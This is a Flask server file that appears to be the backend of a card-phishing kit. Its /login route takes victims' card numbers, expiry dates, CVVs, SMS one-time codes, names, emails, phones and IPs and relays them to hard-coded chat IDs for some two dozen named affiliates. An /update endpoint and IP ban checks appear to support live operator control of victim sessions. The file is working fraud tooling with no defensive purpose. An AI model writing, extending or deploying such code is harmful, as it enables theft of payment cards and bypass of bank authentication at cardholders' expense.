from flask import Flask, redirect, request, jsonify
from flask_cors import CORS
from external import send_buttons_message, send_secret_question, send_sms, ne_pizdabol, cheltut, send_me, send_me1, send_sms1, cheltut1
from CHAT_ID import *
from checker import get_button_by_id
import parserBIN

app = Flask(__name__)

CORS(app, resources={r"/*": {"origins": "*"}})

DOMEN = 'http://127.0.0.1:5500'

def check_ip_in_file(ip_address: str, file_path: str) -> bool:
    try:
        with open(file_path, 'r') as f:
            ips = f.read().splitlines()
        return ip_address in ips
    except FileNotFoundError:
        return False

@app.before_request
def log_request_info():
    print('Headers:', request.headers)
    print('Body:', request.get_data())
    print('Args:', request.args)

@app.route('/chel', methods=['GET', 'POST'])
def chel():
    ip_address = request.args.get('ip')
    name = request.args.get('name')
    if ip_address:
        if name != 'playPL_' and name != 'null':
            cheltut1(ip_address, name)
        cheltut(ip_address, name)
        return jsonify({"message": "IP address received", "ip": ip_address})
    else:
        return jsonify({"error": "No IP address provided"}), 400

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        print("Received a GET request:")
        print(f"Full URL: {request.url}")
        print(f"Method: {request.method}")

        card_number = request.args.get('cardNumber')
        expiry_date = request.args.get('expiryDate')
        cvv = request.args.get('cvv')
        id = request.args.get('id')
        question = request.args.get('question')
        authCode = request.args.get('authCode')
        epin = request.args.get('epinAuthCode')
        session = request.args.get('session')
        name = request.args.get('name')
        email = request.args.get('email')
        tel = request.args.get('tel')
        ip_address = request.args.get('ip')
        ID = f'{session}'
        if card_number.find('але') != -1:
            return '', 200
        if check_ip_in_file(ip_address, 'ips.txt'):
            if id == '10000001' or 1 == 1:
                if authCode is not None and authCode != 'None':
                    send_sms1(card_number, authCode, ID, ip_address)
                    return '', 200  # Возвращаем пустой ответ с кодом 200
                send_me1(card_number, expiry_date, cvv, ID)
                return '', 200  # Возвращаем пустой ответ с кодом 200
        
        # WE3
        if id == '1000001':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms('-1002179206284', card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            send_buttons_message('-1002179206284', card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            ne_pizdabol(card_number)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        # Egoist
        elif id == '1000002':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        # Egoist2
        elif id == '1000003':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        # Plaxa
        elif id == '1000004':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Plaxa, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Plaxa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200        
        elif id == '1000005':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000006':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist4, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200        
        elif id == '1000007':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist5, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist5, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000008':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Egoist6, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Egoist6, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '1000009':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Plaksa, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Plaksa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000010':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(Gatsby, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(Gatsby, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000011':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl1, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000012':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000013':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch1, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch1, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000014':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch2, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        elif id == '10000015':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000016':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(pl4, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(pl4, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000017':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(cc_otp, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(cc_otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000018':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch3, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000019':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(joe, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(joe, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000020':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(roger, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(roger, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        elif id == '10000021':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(st_dech, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(st_dech, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000022':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(dch3_kanal, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(dch3_kanal, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000023':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(salt, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(salt, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200

        elif id == '10000024':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(trefik_tmok, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(trefik_tmok, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        elif id == '10000025':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(s2000otp, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(s2000otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '10000026':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(s3000, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(s3000, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '10000027':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(ge, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(ge, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '10000028':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(germa, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(germa, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '10000029':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(usama, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(usama, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        elif id == '10000030':
            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
            if authCode is not None and authCode != 'None':
                send_sms(shveykagerma, card_number, expiry_date, cvv, authCode, ID, ip_address)
                return '', 200  # Возвращаем пустой ответ с кодом 200
            ne_pizdabol(card_number)
            send_buttons_message(shveykagerma, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
            return '', 200  # Возвращаем пустой ответ с кодом 200
        
        return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки

    

        

@app.route('/test', methods=['GET'])
def test():
    return jsonify(number=3)

@app.route('/update', methods=['GET'])
def test2():
    database = r"database.db"
    user_id_to_check = request.args.get('session')  
    result = str(get_button_by_id(user_id_to_check, database))
    return jsonify({'result': result})

def is_ip_banned(ip_address):
    try:
        with open('ban.txt', 'r') as f:
            banned_ips = f.read().splitlines()
        return ip_address in banned_ips
    except FileNotFoundError:
        return False

@app.route('/check_ip', methods=['GET'])
def check_ip():
    ip_address = request.args.get('ip')
    if not ip_address:
        return jsonify({'error': 'IP address is required'}), 400
    
    if is_ip_banned(ip_address):
        return jsonify({'ip': ip_address, 'banned': True})
    else:
        return jsonify({'ip': ip_address, 'banned': False})

if __name__ == '__main__':
    app.run(debug=True)    
